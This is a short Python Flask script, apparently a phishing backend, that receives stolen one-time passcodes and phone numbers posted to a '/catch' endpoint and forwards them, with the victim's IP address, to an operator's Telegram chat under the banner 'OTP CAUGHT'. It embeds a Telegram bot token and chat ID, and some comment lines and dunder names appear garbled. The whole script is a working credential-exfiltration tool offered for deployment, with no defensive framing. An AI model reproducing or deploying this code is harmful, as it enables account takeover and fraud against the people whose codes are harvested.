pip install flask telebot requests
from flask import Flask, request
import telebot
import os

--- CONFIGURATION ---
Replace these with your actual BotFather token and userinfobot chat ID.
BOT_TOKEN = "9022818782:AAHGeinKHFVFHLwZA0XNzZHlS-INsrOPT-4"
CHAT_ID = "8698352336"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(name)

@app.route('/', methods=['GET'])
def health():
    # Render uses this to check if the app is alive
    return "OK", 200

@app.route('/catch', methods=['POST'])
def catch_otp():
    data = request.json
    if not data:
        return "No data", 400

    otp = data.get('otp', 'N/A')
    phone = data.get('phone', 'Unknown')
    ip = request.remote_addr

Send the OTP to your Telegram
    msg = f"🔥 OTP CAUGHT 🔥\n\n📱 Target: {phone}\n🔢 OTP: {otp}\n🌐 IP: {ip}"
    try:
        bot.send_message(CHAT_ID, msg, parse_mode='Markdown')
    except Exception as e:
        print(f"Failed to send message: {e}")
        return "Telegram error", 500

    return "Success", 200

if name == 'main':
    # Render provides the PORT env variable
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
